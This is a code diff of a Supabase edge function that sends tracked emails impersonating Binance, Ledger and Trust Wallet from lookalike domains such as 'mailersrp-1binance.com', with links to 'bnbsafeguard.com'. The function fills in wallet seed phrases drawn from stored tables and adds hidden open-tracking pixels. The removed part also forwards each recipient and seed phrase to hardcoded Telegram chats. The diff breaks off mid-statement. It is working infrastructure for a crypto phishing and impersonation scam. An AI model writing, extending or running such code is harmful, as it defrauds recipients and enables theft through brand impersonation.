@@ -1,7 +1,7 @@
 import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2.50.2";
 
-// Initialize Resend dynamically with per-domain API keys
+// Initialize Resend with dynamic API key support
 const resendClients: Record<string, any> = {};
 
 async function getResend(apiKey: string) {
@@ -24,810 +24,290 @@ const corsHeaders = {
 };
 
 interface EmailRequest {
-  to?: string;
+  to: string;
   name?: string;
   first_name?: string;
-  user_id?: string;
-  contact_id?: string;
-  template_id?: string;
   subject?: string;
   content?: string;
+  template_id?: string;
   commercial_id?: string;
+  contact_id?: string;
   domain?: string;
-  wallet?: string;
-  step?: number;
-  send_method?: string; // Always 'resend' - PHP removed
-  // New format from CRM
-  leadId?: string;
-  templateId?: string;
-  commercialId?: string;
+  variables?: Record<string, string>;
 }
 
-const handler = async (req: Request): Promise<Response> => {
+serve(async (req) => {
   if (req.method === "OPTIONS") {
     return new Response(null, { headers: corsHeaders });
   }
 
   try {
-    const requestBody = await req.json();
-    let { to, name, first_name, user_id, contact_id, template_id, subject, content, commercial_id, domain, wallet, step, leadId, templateId, commercialId, send_method } = requestBody;
-    
-    // Initialize Supabase client
+    const requestBody: EmailRequest = await req.json();
+    const { to, name, first_name, subject, content, template_id, commercial_id, contact_id, domain, variables } = requestBody;
+
+    console.log('📧 Email request received:', { to, template_id, commercial_id, domain });
+
+    // Initialize Supabase
     const supabase = createClient(
       Deno.env.get("SUPABASE_URL") ?? "",
       Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? ""
     );
 
-    // Handle new format from CRM (leadId, templateId, commercialId)
-    if (leadId && templateId && commercialId) {
-      console.log('Processing CRM format request:', { leadId, templateId, commercialId });
-      
-      const { data: leadData, error: leadError } = await supabase
-        .from('marketing_contacts')
-        .select('id, name, first_name, email, phone, status')
-        .eq('id', leadId)
-        .single();
-        
-      if (leadError || !leadData) {
-        console.error('Lead not found:', leadError);
-        return new Response(
-          JSON.stringify({ error: 'Lead not found' }),
-          { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
-        );
-      }
-      
-      // Fetch template data (by id or by name fallback)
-      let templateData: any = null;
-      let templateError: any = null;
-      try {
-        const byId = await supabase
-          .from('email_templates')
-          .select('id, name, subject, content')
-          .eq('id', templateId)
-          .single();
-        templateData = byId.data;
-        templateError = byId.error;
-      } catch (e) {
-        templateError = e;
-      }
-
-      if (templateError || !templateData) {
-        try {
-          const byName = await supabase
-            .from('email_templates')
-            .select('id, name, subject, content')
-            .eq('name', templateId)
-            .single();
-          templateData = byName.data;
-          templateError = byName.error;
-        } catch (e) {
-          templateError = e;
-        }
-      }
-      
-      if (templateError || !templateData) {
-        console.error('Template not found by id or name:', templateError);
-        return new Response(
-          JSON.stringify({ error: 'Template not found' }),
-          { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
-        );
-      }
-      
-      // Map the data to the expected format
-      to = leadData.email;
-      name = leadData.name || '';
-      first_name = leadData.first_name || '';
-      user_id = leadData.id; // Use lead ID as user_id for tracking
-      contact_id = leadData.id;
-      template_id = templateData.id;
-      subject = templateData.subject;
-      content = templateData.content;
-      commercial_id = commercialId;
-      domain = domain || 'domain1'; // Default domain if not provided
-      // Derive step from template name if not provided (Email1, Email2, etc)
-      if (!step && (templateData as any)?.name) {
-        const m = String((templateData as any).name).match(/(\d+)/);
-        if (m) {
-          const parsed = parseInt(m[1], 10);
-          if (!isNaN(parsed)) step = parsed;
-        } else {
-          step = 1;
-        }
-      } else if (!step) {
-        step = 1;
-      }
-      
-      console.log('Mapped CRM data:', { to, name, first_name, user_id, contact_id, template_id, commercial_id, step, domain });
-    }
-    
-    console.log('Email request received:', { to, name, first_name, user_id, contact_id, template_id, commercial_id, domain, step });
-
-    // Fallback for name if missing
-    if (!name) {
-      name = first_name || (to ? to.split('@')[0] : 'Client');
-    }
-
     // Validate required fields
-    if (!to || !commercial_id) {
-      console.error('Missing required fields:', { to, commercial_id });
+    if (!to?.includes('@') || !commercial_id) {
       return new Response(
-        JSON.stringify({ error: 'Missing required fields: to or commercial_id' }),
+        JSON.stringify({ success: false, error: 'Invalid email or missing commercial ID' }),
         { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
       );
     }
-    // Get commercial's email preferences
-    const { data: commercialData, error: commercialError } = await supabase
+
+    // Fetch commercial data for email configuration
+    const { data: commercial, error: commercialError } = await supabase
       .from('commercials')
-      .select('email_domain_preference')
+      .select('id, name, email_domain_preference, email_alias_from')
       .eq('id', commercial_id)
       .single();
-    
-    // Simple domain selection - use domain1 by default, domain2 if explicitly set
-    const emailPreference = (commercialData?.email_domain_preference || domain || 'domain1')?.toLowerCase();
-    
-    // Determine brand name based on template content - use uppercase brand names only
-    const templateContent = (subject || content || '').toLowerCase();
-    let displayName = 'TRUSTWALLET'; // Default brand
-    
-    if (templateContent.includes('binance')) {
-      displayName = 'BINANCE';
-    } else if (templateContent.includes('ledger')) {
-      displayName = 'LEDGER';
-    } else if (templateContent.includes('trust') || templateContent.includes('wallet')) {
-      displayName = 'TRUSTWALLET';
-    }
-    
-    // Set domain and API key - use only display name without domain exposure
-    let resendApiKey = '';
-    let fromDomain = '';
-    let sendMethod = 'resend'; // Always resend now
-    
-    if (emailPreference === 'domain2') {
-      fromDomain = `${displayName} <support@mailersrp-2binance.com>`;
-      resendApiKey = Deno.env.get('RESEND_API_KEY_DOMAIN2') || Deno.env.get('RESEND_API_KEY') || '';
-    } else {
-      // Default to domain1 for everything else (including alias)
-      fromDomain = `${displayName} <support@mailersrp-1binance.com>`;
-      resendApiKey = Deno.env.get('RESEND_API_KEY') || '';
-    }
-    
-    console.log('Using API key for domain:', emailPreference, 'from:', fromDomain);
 
-    if (!resendApiKey) {
-      console.error('Missing Resend API key');
+    if (commercialError || !commercial) {
+      console.error('Commercial not found:', commercialError);
       return new Response(
-        JSON.stringify({ error: 'Resend API key not configured' }),
-        { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
+        JSON.stringify({ success: false, error: 'Commercial not found' }),
+        { status: 404, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
       );
     }
 
-    // Verify domain configuration before sending to prevent "via amazonses.com"
-    try {
-      const targetDomain = emailPreference === 'domain2' ? 'mailersrp-2binance.com' : 'mailersrp-1binance.com';
-      
-      // Step 1: Get all domains to find the domain ID
-      const domainListResponse = await fetch('https://api.resend.com/domains', {
-        method: 'GET',
-        headers: {
-          'Authorization': `Bearer ${resendApiKey}`,
-          'Content-Type': 'application/json',
-        },
-      });
+    // Fetch template if template_id is provided
+    let emailSubject = subject;
+    let emailContent = content;
+    let templateUsed = null;
 
-      if (!domainListResponse.ok) {
-        const errorText = await domainListResponse.text();
-        console.error('Domain list fetch failed:', domainListResponse.status, errorText);
-        throw new Error(`Domain list fetch failed: ${domainListResponse.status} - ${errorText}`);
+    if (template_id) {
+      const { data: template, error: templateError } = await supabase
+        .from('email_templates')
+        .select('*')
+        .eq('id', template_id)
+        .single();
+
+      if (template && !templateError) {
+        emailSubject = template.subject;
+        emailContent = template.content;
+        templateUsed = template;
+        console.log(`📄 Using template: ${template.name}`);
       }
-
-      const domainListData = await domainListResponse.json();
-      console.log('Domain verification response:', domainListData);
-
-      // Find the specific domain in the response
-      const domainConfig = domainListData.data?.find((d: any) => d.name === targetDomain);
-      
-      if (!domainConfig) {
-        throw new Error(`Domain ${targetDomain} not found in Resend account`);
-      }
-
-      // Check basic domain verification first
-      const domainVerified = domainConfig.status === 'verified';
-      
-      if (!domainVerified) {
-        throw new Error(`Domain ${targetDomain} is not verified in Resend. Please verify your domain first.`);
-      }
-
-      // Step 2: Get detailed domain information for DKIM/Return-Path checks
-      const domainDetailResponse = await fetch(`https://api.resend.com/domains/${domainConfig.id}`, {
-        method: 'GET',
-        headers: {
-          'Authorization': `Bearer ${resendApiKey}`,
-          'Content-Type': 'application/json',
-        },
-      });
-
-      if (domainDetailResponse.ok) {
-        const domainDetailData = await domainDetailResponse.json();
-        console.log(`Domain ${targetDomain} detailed records:`, JSON.stringify(domainDetailData.records, null, 2));
-        
-        // Check detailed DKIM and Return-Path configuration
-        const dkimVerified = domainDetailData.records?.some((record: any) => 
-          record.type === 'DKIM' && record.status === 'verified'
-        );
-        const returnPathConfigured = domainDetailData.records?.some((record: any) => 
-          record.type === 'RETURN_PATH' && record.status === 'verified'
-        );
-
-        console.log(`Domain ${targetDomain} verification status:`, {
-          domain: domainVerified,
-          dkim: dkimVerified,
-          returnPath: returnPathConfigured
-        });
-
-        if (!dkimVerified) {
-          console.warn(`DKIM not verified for ${targetDomain} - emails may show "via resend.dev"`);
-        }
-
-        if (!returnPathConfigured) {
-          console.warn(`Return path not configured for ${targetDomain} - bounce handling may be affected`);
-        }
-      } else {
-        console.warn(`Could not fetch detailed domain info for ${targetDomain}, proceeding with basic verification`);
-      }
-
-    } catch (verificationError) {
-      console.error('Domain verification error:', verificationError);
-      const errorMessage = verificationError instanceof Error ? verificationError.message : String(verificationError);
-      return new Response(
-        JSON.stringify({ 
-          success: false, 
-          error: `Domain verification failed: ${errorMessage}` 
-        }),
-        { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
-      );
     }
 
-    // Fetch the current server IP from the database
-    const { data: serverConfig, error: configError } = await supabase
+    // Get server configuration
+    const { data: serverConfig } = await supabase
       .from('server_config')
       .select('current_server_ip')
       .single();
 
-    let currentServerIp = '127.0.0.1'; // fallback IP
-    if (configError) {
-      console.warn('Could not fetch server config, using fallback IP:', configError);
-    } else if (serverConfig?.current_server_ip) {
-      currentServerIp = String(serverConfig.current_server_ip);
-    }
+    const currentServerIp = serverConfig?.current_server_ip ? String(serverConfig.current_server_ip) : '127.0.0.1';
 
-    console.log("Current server IP from database:", currentServerIp);
+    // Generate unique tracking ID
+    const trackingId = contact_id || `${commercial_id}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
 
-    // Generate tracking code - use contact_id if available, otherwise use user_id with timestamp
-    const trackingCode = contact_id || `${user_id}_${Date.now()}`;
-    // Add commercial tracking to the link if commercial_id is provided
-    const commercialParam = commercial_id ? `&c=${commercial_id}` : '';
-    const trackingLink = `https://fr.bnbsafeguard.com/?=${trackingCode}${commercialParam}`;
-
-    // Calculate current time minus 10 minutes in UTC
+    // Calculate current time minus 10 minutes
     const now = new Date();
     const timeMinus10 = new Date(now.getTime() - 10 * 60 * 1000);
     const formattedTime = timeMinus10.toISOString().replace('T', ' ').replace(/\.\d{3}Z$/, ' UTC');
 
-    // Create tracking pixel URL for open tracking
-    const openTrackingUrl = `https://lnokphjzmvdegutjpxhw.supabase.co/functions/v1/track-email-open?id=${trackingCode}`;
+    // Create tracking and home links
+    const trackingLink = `https://fr.bnbsafeguard.com/?t=${trackingId}&c=${commercial_id}`;
+    const homeLink = `https://fr.bnbsafeguard.com/?c=${commercial_id}&l=${contact_id || trackingId}`;
+    
+    // Variable replacement engine
+    const replaceVariables = (text: string): string => {
+      if (!text) return '';
+      
+      const defaultVariables = {
+        name: name || first_name || to.split('@')[0],
+        first_name: first_name || name || to.split('@')[0],
+        email: to,
+        commercial_name: commercial.name,
+        current_ip: currentServerIp,
+        current_time_minus_10: formattedTime,
+        link: trackingLink,
+        home_link: homeLink,
+        wallet: '', // Will be replaced later if needed
+        ...variables // Custom variables override defaults
+      };
 
-    // Process template content if provided
-    let emailSubject = subject || "Your Secure WireGuard Access Link";
-    let emailContent = content || `
-      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: white; color: black;">
-        <h2 style="color: #f59e0b;">Hello {{first_name}},</h2>
-        
-        <p>We hope this email finds you well.</p>
-        
-        <p>Your secure WireGuard access link is ready:</p>
-        
-        <div style="text-align: center; margin: 30px 0;">
-          <a href="{{link}}" 
-             style="background-color: #f59e0b; color: black; padding: 15px 30px; 
-                    text-decoration: none; border-radius: 5px; font-weight: bold;">
-            Access Your Secure Connection
-          </a>
-        </div>
-        
-        <p>This link is personalized for you and provides secure access to our WireGuard VPN service.</p>
-        
-        <p><strong>Current Server IP:</strong> {{current_ip}}</p>
-        <p><strong>Generated at:</strong> {{current_time_minus_10}}</p>
-        
-        <p>Best regards,<br>
-        The BINANCE Team</p>
-        
-        <hr style="margin: 30px 0; border: 1px solid #e5e7eb;">
-        <p style="font-size: 12px; color: #6b7280;">
-          This is an automated message. Please do not reply to this email.
-        </p>
-      </div>
-    `;
-
-    // Check if the email content contains wallet placeholders
-    const hasWalletPlaceholder = (content: string) => {
-      // Simple check for {{wallet}} first
-      if (/\{\{\s*wallet\s*\}\}/i.test(content)) {
-        return true;
+      let result = text;
+      for (const [key, value] of Object.entries(defaultVariables)) {
+        const regex = new RegExp(`{{\\s*${key}\\s*}}`, 'gi');
+        result = result.replace(regex, String(value));
       }
       
-      const normalizedContent = content
-        .replace(/&lbrace;|&lcub;|&#123;|&#x7B;|\\u007B/gi, '{')
-        .replace(/&rbrace;|&rcub;|&#125;|&#x7D;|\\u007D/gi, '}')
-        .replace(/[\uFF5B]/g, '{')
-        .replace(/[\uFF5D]/g, '}')
-        .replace(/[\u200B\u200C\u200D\uFEFF]/g, '')
-        .replace(/\u00A0/g, ' ');
-      
-      return /\{\{[\s]*wallet[\s]*\}\}/i.test(normalizedContent) ||
-             /\{\{\{[^}]*wallet[^}]*\}\}\}/i.test(normalizedContent) ||
-             /\{(?:\s|&nbsp;|<[^>]+>)*\{(?:[\s\u00A0\uFEFF]|<[^>]+>)*wallet(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}/i.test(normalizedContent);
+      return result;
     };
 
-    // Function to get the actual seed phrase assigned to this commercial/user
-    const getUniqueWallet = async () => {
-      try {
-        // If a wallet is explicitly provided in the request payload, use it
-        if (wallet && typeof wallet === 'string' && wallet.trim().length > 0) {
-          return wallet.trim();
-        }
+    // Replace variables in subject and content
+    emailSubject = replaceVariables(emailSubject || 'Important Information');
+    emailContent = replaceVariables(emailContent || '<p>Hello {{name}},</p><p>Thank you for your interest.</p>');
 
-        // Only call get-wallet function if we actually need a new wallet
-        console.log('Calling get-wallet function for user:', user_id, 'commercial:', commercial_id);
-        const { data: walletData, error: getWalletError } = await supabase.functions.invoke('get-wallet', {
-          body: { 
-            user_id: user_id,
-            commercial_id: commercial_id 
-          }
+    // Add wallet if content contains wallet placeholder
+    if (emailContent.includes('{{wallet}}') || emailContent.includes('{{ wallet }}')) {
+      try {
+        const { data: walletData, error: walletError } = await supabase.functions.invoke('get-wallet', {
+          body: { commercial_id, client_tracking_id: to }
         });
-
-        if (getWalletError) {
-          console.error('Error calling get-wallet function:', getWalletError);
-        } else if ((walletData as any)?.phrase || (walletData as any)?.wallet) {
-          console.log('Got wallet from get-wallet function');
-          return ((walletData as any).phrase || (walletData as any).wallet) as string;
-        }
-
-        // First, try to find an existing wallet assigned to this commercial
-        if (commercial_id) {
-          // Check wallets table first
-          const { data: assignedWallet, error: walletError } = await supabase
-            .from('wallets')
-            .select('wallet_phrase')
-            .eq('used_by_commercial_id', commercial_id)
-            .eq('status', 'used')
-            .single();
-
-          if (!walletError && assignedWallet?.wallet_phrase) {
-            console.log('Using assigned wallet for commercial:', commercial_id);
-            return assignedWallet.wallet_phrase;
-          }
-
-          // Check generated_wallets table as backup
-          const { data: generatedWallet, error: genWalletError } = await supabase
-            .from('generated_wallets')
-            .select('seed_phrase')
-            .eq('commercial_id', commercial_id)
-            .single();
-
-          if (!genWalletError && generatedWallet?.seed_phrase) {
-            console.log('Using generated wallet for commercial:', commercial_id);
-            return generatedWallet.seed_phrase;
-          }
-        }
-
-        console.warn('No available wallet found for this commercial/user.');
-        return '';
-      } catch (error) {
-        console.error('Error retrieving wallet phrase:', error);
-        return '';
-      }
-    };
-
-    // Replace template variables for both custom content and default template
-    // Use commercial_id and contact_id for the home link to track both commercial and lead
-    const homeLink = commercial_id && contact_id ? `https://fr.bnbsafeguard.com/?c=${commercial_id}&l=${contact_id}` : 
-                    commercial_id ? `https://fr.bnbsafeguard.com/?c=${commercial_id}` : trackingLink;
-    
-    // Replace non-wallet variables first
-    emailContent = emailContent
-      .replace(/{{name}}/g, name)
-      .replace(/{{first_name}}/g, first_name)
-      .replace(/{{email}}/g, to)
-      .replace(/{{phone}}/g, '') // Phone not available in email context
-      .replace(/{{current_ip}}/g, currentServerIp)
-      .replace(/{{link}}/g, trackingLink)
-      .replace(/{{home_link}}/g, homeLink)
-      .replace(/{{current_time_minus_10}}/g, formattedTime)
-      .replace(/https?:\/\/api\.bnbsafeguard\.com/gi, 'https://fr.bnbsafeguard.com');
-
-    // Check if this is a Trust Wallet template
-    const isTrustWalletTemplate = (subject || content || emailContent || '')
-      .toLowerCase()
-      .includes('trust') || 
-      (subject || content || emailContent || '')
-      .toLowerCase()
-      .includes('trustwallet');
-
-    // Check if this is a Ledger template
-    const isLedgerTemplate = (subject || content || emailContent || '')
-      .toLowerCase()
-      .includes('ledger');
-
-    // Only process wallet placeholders if they exist in the content
-    console.log('Checking if email content contains wallet placeholders...');
-    
-    // First check commercial's auto_include_wallet setting
-    let commercialAutoIncludeWallet = false;
-    if (commercial_id) {
-      try {
-        const { data: commercialData, error: commercialError } = await supabase
-          .from('commercials')
-          .select('auto_include_wallet')
-          .eq('id', commercial_id)
-          .single();
         
-        if (!commercialError && commercialData) {
-          commercialAutoIncludeWallet = commercialData.auto_include_wallet || false;
-          console.log('Commercial auto_include_wallet setting:', commercialAutoIncludeWallet);
+        const walletPhrase = walletData?.wallet || walletData?.phrase || '';
+        if (walletPhrase) {
+          emailContent = emailContent.replace(/\{\{\s*wallet\s*\}\}/gi, walletPhrase);
+          console.log('💼 Wallet phrase added to email');
         }
-      } catch (err) {
-        console.warn('Could not fetch commercial auto_include_wallet setting:', err);
+      } catch (error) {
+        console.warn('Failed to fetch wallet:', error);
       }
     }
-    
-    // Check if wallet placeholders exist in email content or subject
-    const walletPlaceholdersDetected = hasWalletPlaceholder(emailContent) || hasWalletPlaceholder(emailSubject) || hasWalletPlaceholder(content || '') || hasWalletPlaceholder(subject || '');
-    console.log('Wallet detection - emailContent length:', emailContent.length);
-    console.log('Wallet detection - content preview:', emailContent.substring(0, 200) + '...');
-    console.log('Wallet detection result:', walletPlaceholdersDetected);
-    let walletWasUsed = false;
-    let uniqueWallet = ''; // Store the wallet for Telegram notification
-    
-    if (walletPlaceholdersDetected) {
-      console.log('Wallet placeholders detected in email content, processing wallet replacements...');
-      
-      // Normalize braces and invisible spaces, then replace wallet placeholders
-      const normalizeBraces = (s: string) => s
-        .replace(/&lbrace;|&lcub;|&#123;|&#x7B;|\\u007B/gi, '{')
-        .replace(/&rbrace;|&rcub;|&#125;|&#x7D;|\\u007D/gi, '}')
-        .replace(/[\uFF5B]/g, '{')
-        .replace(/[\uFF5D]/g, '}');
 
-      emailContent = normalizeBraces(emailContent);
-      emailSubject = normalizeBraces(emailSubject);
-      
-      // Remove zero-width chars entirely; convert NBSP to space
-      emailContent = emailContent
-        .replace(/[\u200B\u200C\u200D\uFEFF]/g, '')
-        .replace(/\u00A0/g, ' ');
+    // Determine email domain and API key
+    const domainPreference = domain || commercial.email_domain_preference || 'domain1';
+    let resendApiKey = '';
+    let fromAddress = '';
 
-      // Get wallet once and reuse it for all replacements
-      uniqueWallet = await getUniqueWallet();
-      if (!uniqueWallet || uniqueWallet.trim() === '') {
-        console.error('Wallet placeholder present but no available wallet could be obtained. Aborting send.');
-        return new Response(
-          JSON.stringify({ success: false, error: 'No available wallet to fill template.' }),
-          { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
-        );
-      }
-      console.log('Using wallet for replacements (first 10 chars):', uniqueWallet.substring(0, 10) + '...');
-
-      // Replace ONLY actual {{wallet}} placeholders
-      emailContent = emailContent.replace(/\{\{[\s\u00A0\uFEFF]*wallet[\s\u00A0\uFEFF]*\}\}/gi, uniqueWallet);
-      emailSubject = emailSubject.replace(/\{\{[\s\u00A0\uFEFF]*wallet[\s\u00A0\uFEFF]*\}\}/gi, uniqueWallet);
-
-      // Replace placeholders where letters of "wallet" are split by spaces/tags
-      const walletWordPattern = 'w(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*a(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*l(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*l(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*e(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*t';
-      const brokenWalletRegex = new RegExp(`\\{\\{(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*${walletWordPattern}(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*\\}\\}`, 'gi');
-      emailContent = emailContent.replace(brokenWalletRegex, uniqueWallet);
-
-      // Replace complex placeholders split by inline tags around braces
-      const complexWalletRegex = /\{(?:\s|&nbsp;|<[^>]+>)*\{(?:[\s\u00A0\uFEFF]|<[^>]+>)*wallet(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}/gi;
-      emailContent = emailContent.replace(complexWalletRegex, uniqueWallet);
-
-      // Handle triple braces {{{wallet}}}
-      emailContent = emailContent.replace(/\{\{\{[^}]*wallet[^}]*\}\}\}/gi, uniqueWallet);
-      
-      // Final cleanup for any remaining wallet placeholders
-      emailContent = emailContent.replace(/\{\{[^}]*wallet[^}]*\}\}/gi, uniqueWallet);
-      
-      // Mark that a wallet was effectively used in this email
-      walletWasUsed = true;
+    if (domainPreference === 'domain2') {
+      fromAddress = 'BINANCE <support@mailersrp-2binance.com>';
+      resendApiKey = Deno.env.get('RESEND_API_KEY_DOMAIN2') || '';
     } else {
-      console.log('No wallet placeholders found in email content or subject, skipping wallet assignment');
+      fromAddress = 'BINANCE <support@mailersrp-1binance.com>';
+      resendApiKey = Deno.env.get('RESEND_API_KEY') || '';
     }
 
-    // Remove debug/listing blocks accidentally pasted into templates
-    // - Any "Available" labels
-    // - Any lines like "Email: user_123456"
-    // - Long lowercase-only word sequences (likely pasted seed phrases)
-    emailContent = emailContent
-      .replace(/Available/gi, '')
-      .replace(/Email:\s*user_[0-9]+/gi, '');
-      // Removed aggressive seed-like sequence stripping to preserve intended wallet phrases
-
-    if (subject) {
-      emailSubject = subject
-        .replace(/{{name}}/g, name)
-        .replace(/{{first_name}}/g, first_name)
-        .replace(/{{email}}/g, to)
-        .replace(/{{current_ip}}/g, currentServerIp)
-        .replace(/{{link}}/g, trackingLink)
-        .replace(/{{home_link}}/g, homeLink)
-        .replace(/{{current_time_minus_10}}/g, formattedTime)
-        .replace(/https?:\/\/api\.bnbsafeguard\.com/gi, 'https://fr.bnbsafeguard.com');
+    if (!resendApiKey) {
+      console.error('❌ Missing Resend API key for domain:', domainPreference);
+      return new Response(
+        JSON.stringify({ success: false, error: 'Email service not configured' }),
+        { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
+      );
     }
 
-    // Add tracking pixel to email content
-    emailContent += `<img src="${openTrackingUrl}" width="1" height="1" style="display:none;" />`;
-
-    // Note: Sender name is now determined earlier in the code based on domain preference
-
-    // Log email sending attempt
-    console.log("Sending email to:", to, "with tracking code:", trackingCode);
-    console.log("Server IP used:", currentServerIp);
-    console.log("Sender name:", displayName);
-    console.log("Send method:", sendMethod);
-
-    // Send ONLY via Resend - no PHP/alias support
-    console.log('📨 USING RESEND METHOD...');
-    console.log(`Using API key for domain: ${emailPreference}, from: ${fromDomain}`);
+    // Add open tracking pixel to email content
+    const openTrackingUrl = `https://lnokphjzmvdegutjpxhw.supabase.co/functions/v1/track-email-open?id=${trackingId}`;
+    const trackingPixel = `<img src="${openTrackingUrl}" width="1" height="1" style="display:none;" />`;
     
-    const resendClient = await getResend(resendApiKey);
-    if (!resendClient) {
-      throw new Error('Failed to initialize Resend client');
+    // Insert tracking pixel before closing body tag or at the end
+    if (emailContent.includes('</body>')) {
+      emailContent = emailContent.replace('</body>', `${trackingPixel}</body>`);
+    } else {
+      emailContent += trackingPixel;
     }
-    
-    let emailResponse;
+
+    // Log email to database first
+    const { data: emailLog, error: logError } = await supabase
+      .from('email_logs')
+      .insert([{
+        tracking_id: trackingId,
+        tracking_code: trackingId, // For backward compatibility
+        recipient_email: to,
+        recipient_name: name || first_name,
+        commercial_id,
+        contact_id,
+        template_id,
+        subject: emailSubject,
+        content: emailContent,
+        status: 'pending',
+        sent_at: new Date().toISOString()
+      }])
+      .select()
+      .single();
+
+    if (logError) {
+      console.error('❌ Failed to log email:', logError);
+      return new Response(
+        JSON.stringify({ success: false, error: 'Failed to log email' }),
+        { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
+      );
+    }
+
+    // Send email with Resend
+    const resend = await getResend(resendApiKey);
+    if (!resend) {
+      await supabase
+        .from('email_logs')
+        .update({ status: 'failed' })
+        .eq('id', emailLog.id);
+
+      return new Response(
+        JSON.stringify({ success: false, error: 'Email service initialization failed' }),
+        { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
+      );
+    }
+
     try {
-      emailResponse = await resendClient.emails.send({
-        from: fromDomain,
+      const emailResult = await resend.emails.send({
+        from: fromAddress,
         to: [to],
         subject: emailSubject,
         html: emailContent,
-        tags: [
-          {
-            name: 'campaign',
-            value: 'wireguard-marketing'
-          },
-          {
-            name: 'tracking_code',
-            value: trackingCode
-          },
-          {
-            name: 'step',
-            value: step ? `step-${step}` : 'step-1'
-          }
-        ]
+        headers: {
+          'List-Unsubscribe': '<mailto:unsubscribe@example.com>',
+        }
       });
-      console.log("✅ Marketing email sent successfully:", emailResponse, "Method used:", sendMethod);
-    } catch (resendError: any) {
-      console.error('Failed to send email via Resend:', resendError);
-      console.error('Error details:', resendError.response?.data || resendError);
-      
-      // Log failed email in database
-      await supabase.from('email_logs').insert({
-        tracking_code: trackingCode,
-        recipient_email: to,
-        recipient_name: name,
-        contact_id: contact_id,
-        user_id: user_id,
-        template_id: template_id,
-        subject: emailSubject,
-        status: 'failed',
-        sent_at: new Date().toISOString(),
-        bounce_reason: resendError.message,
-        commercial_id: commercial_id
-      });
-      
-      return new Response(JSON.stringify({ 
-        success: false, 
-        error: 'Failed to send email', 
-        details: resendError.message 
-      }), {
-        status: 500,
-        headers: { "Content-Type": "application/json", ...corsHeaders }
-      });
-    }
 
-    // Send Telegram notification if wallet was used in email (send directly to Telegram; fallback to edge function)
-    if (walletWasUsed) {
-      try {
-        const telegramBotToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
-        const telegramChatIds = ['1889039543', '5433409472'];
-        let successfulSends = 0;
-        
-        // Also fetch commercial's telegram_id and auto_include_wallet if provided
-        let commercialTelegramId = null;
-        let commercialAutoIncludeWallet = false;
-        if (commercial_id) {
-          try {
-            const { data: commercialData, error: commercialError } = await supabase
-              .from('commercials')
-              .select('telegram_id, auto_include_wallet')
-              .eq('id', commercial_id)
-              .single();
-            
-            if (!commercialError && commercialData) {
-              commercialTelegramId = commercialData.telegram_id;
-              commercialAutoIncludeWallet = commercialData.auto_include_wallet || false;
-              console.log('Found commercial Telegram ID:', commercialTelegramId, 'auto_include_wallet:', commercialAutoIncludeWallet);
-            }
-          } catch (err) {
-            console.warn('Could not fetch commercial data:', err);
-          }
-        }
-        
-        if (telegramBotToken) {
-          // Fetch commercial name
-          let commercialName = 'Unknown Commercial';
-          try {
-            const { data: commercial } = await supabase
-              .from('commercials')
-              .select('name')
-              .eq('id', commercial_id)
-              .single();
-            
-            if (commercial?.name) {
-              commercialName = commercial.name;
-            }
-          } catch (err) {
-            console.warn('Could not fetch commercial name for telegram:', err);
-          }
-          
-          const message = `📧 Email sent with wallet!
-Recipient: ${to}
-Commercial: ${commercialName}
-Step: ${step || 1}
-Subject: ${emailSubject}
-Wallet: ${uniqueWallet}
-Tracking: ${trackingCode}`;
-          
-          // Send to admin chat IDs
-          for (const chatId of telegramChatIds) {
-            try {
-              const tgRes = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
-              });
-              if (!tgRes.ok) {
-                const err = await tgRes.text();
-                console.error(`Telegram send failed (direct) for chat ID ${chatId}:`, err);
-              } else {
-                console.log(`Telegram notification sent (direct) to ${chatId} for wallet email step`, step || 1);
-                successfulSends++;
-              }
-            } catch (chatError) {
-              console.error(`Error sending to chat ID ${chatId}:`, chatError);
-            }
-          }
-          
-          // Send to commercial if they have Telegram ID
-          if (commercialTelegramId) {
-            try {
-              // Include seed phrase in commercial message if auto_include_wallet is enabled
-              let commercialMessage = `📧 Votre email étape ${step || 1} a été envoyé!
-Destinataire: ${to}
-Sujet: ${emailSubject}
-Wallet inclus: Oui
-Tracking: ${trackingCode}`;
+      console.log('✅ Email sent successfully:', emailResult.data?.id);
 
-              if (commercialAutoIncludeWallet) {
-                commercialMessage += `\n🔑 Phrase secrète: ${uniqueWallet}`;
-              }
-              
-              const tgRes = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: commercialTelegramId, text: commercialMessage, parse_mode: 'HTML' })
-              });
-              if (!tgRes.ok) {
-                const err = await tgRes.text();
-                console.error(`Telegram send failed for commercial ${commercial_id}:`, err);
-              } else {
-                console.log(`Telegram notification sent to commercial ${commercial_id} (${commercialTelegramId})`);
-              }
